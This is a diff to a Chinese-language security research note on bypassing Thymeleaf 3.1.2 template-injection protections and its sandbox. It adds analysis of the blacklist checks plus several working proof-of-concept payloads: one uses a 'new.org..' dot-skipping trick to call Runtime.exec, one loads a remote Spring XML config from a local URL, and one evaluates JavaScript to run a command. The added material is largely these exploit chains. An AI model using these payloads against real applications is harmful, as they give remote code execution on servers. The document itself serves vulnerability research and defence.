@@ -222,7 +222,39 @@ public String getHome(@PathVariable String page) {
 
 ![image-20231221210152481](./../.gitbook/assets/image-20231221210152481.png)
 
-会往`(`左边一直找`T`
+会往`(`左边一直找`T`，跳过空白符
+
+下面以3.1.2.RELEASE为例
+
+`checkViewNameNotInRequest`做了升级，判断视图名是否含有来自用户的表达式
+
+即判断请求路径和请求查询参数是否含有和视图名相同的表达式
+
+![image-20240222153545727](./../.gitbook/assets/image-20240222153545727.png)
+
+![image-20240222153721798](./../.gitbook/assets/image-20240222153721798.png)
+
+判断表达式的逻辑如下
+
+![image-20240222153827674](./../.gitbook/assets/image-20240222153827674.png)
+
+即看`$`、`*`、`#`、`@`、`~`这些字符后面是否跟着`{`，略过中间的空白字符
+
+通过URL或参数传模板表达式似乎绕不过了。
+
+看看`new`的检测
+
+![image-20240222155654195](./../.gitbook/assets/image-20240222155654195.png)
+
+检测是从字符串后往前检测的，若碰到w且w前面是空白符，就会开始逐一检测字符wen（`new`倒过来）
+
+表达式引擎对`new`解析时，会跳过点号
+
+贴个POC：🐂🍺
+
+```java
+__${new.org..apache.tomcat.util.IntrospectionUtils().getClass().callMethodN(new.org..apache.tomcat.util.IntrospectionUtils().getClass().callMethodN(new.org..apache.tomcat.util.IntrospectionUtils().getClass().findMethod(new.org..springframework.instrument.classloading.ShadowingClassLoader(new.org..apache.tomcat.util.IntrospectionUtils().getClass().getClassLoader()).loadClass("java.lang.Runtime"),"getRuntime",null),"invoke",{null,null},{new.org..springframework.instrument.classloading.ShadowingClassLoader(new.org..apache.tomcat.util.IntrospectionUtils().getClass().getClassLoader()).loadClass("java.lang.Object"),new.org..springframework.instrument.classloading.ShadowingClassLoader(new.org..apache.tomcat.util.IntrospectionUtils().getClass().getClassLoader()).loadClass("org."+"thymeleaf.util.ClassLoaderUtils").loadClass("[Ljava.lang.Object;")}),"exec","calc",new.org..springframework.instrument.classloading.ShadowingClassLoader(new.org..apache.tomcat.util.IntrospectionUtils().getClass().getClassLoader()).loadClass("java.lang.String"))}__::x
+```
 
 # Sandbox Escape
 
@@ -367,7 +399,33 @@ org.apache.tomcat.util.IntrospectionUtils#callMethod1
 org.apache.tomcat.util.IntrospectionUtils#callMethodN
 ```
 
-靠这些默认的依赖暂时没找到可以利用的。。。
+类加载器由`org.springframework.instrument.classloading.ShadowingClassLoader#getSystemClassLoader`获取
+
+远程加载配置造成SpEL：
+
+```java
+<tr th:with="classLoader=${T(org.springframework.instrument.classloading.ShadowingClassLoader).getSystemClassLoader()}">
+    <a th:with="superClass=${T(org.apache.el.util.ReflectionUtil).forName('org.springframework.context.support.AbstractXmlApplicationContext')}">
+        [[${T(ch.qos.logback.core.util.OptionHelper).instantiateByClassNameAndParameter('org.springframework.context.support.ClassPathXmlApplicationContext',superClass,classLoader,''.getClass(),'http://127.0.0.1:8099/poc.xml')}]]
+    </a>
+</tr>
+```
+
+js表达式执行：
+
+```java
+<tr th:with="classLoader=${T(org.springframework.instrument.classloading.ShadowingClassLoader).getSystemClassLoader()}">
+    <a th:with="superClass=${T(org.apache.el.util.ReflectionUtil).forName('java.lang.Object')}">
+        <a th:with="manager=${T(ch.qos.logback.core.util.OptionHelper).instantiateByClassNameAndParameter('javax.script.ScriptEngineManager',superClass, classLoader, null, null)}">
+            <a th:with="engine=${T(org.apache.tomcat.util.IntrospectionUtils).callMethod1(manager, 'getEngineByName', 'js', null, classLoader)}">
+                [[${T(org.apache.tomcat.util.IntrospectionUtils).callMethod1(engine, 'eval', 'java.lang.Runtime.getRuntime().exec("calc")', null, classLoader)}]]
+            </a>
+        </a>
+    </a>
+</tr>
+```
+
+
 
 此外对于成员调用又多了如下限制：
 
@@ -487,3 +545,4 @@ org.apache.tomcat.util.IntrospectionUtils#callMethodN
 * https://github.com/p1n93r/SpringBootAdmin-thymeleaf-SSTI
 * https://blog.0kami.cn/blog/2024/thymeleaf%20ssti%203.1.2%20%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/
 * https://blog.arkark.dev/2022/08/01/uiuctf
+* https://www.bilibili.com/video/BV1t7421K7rB
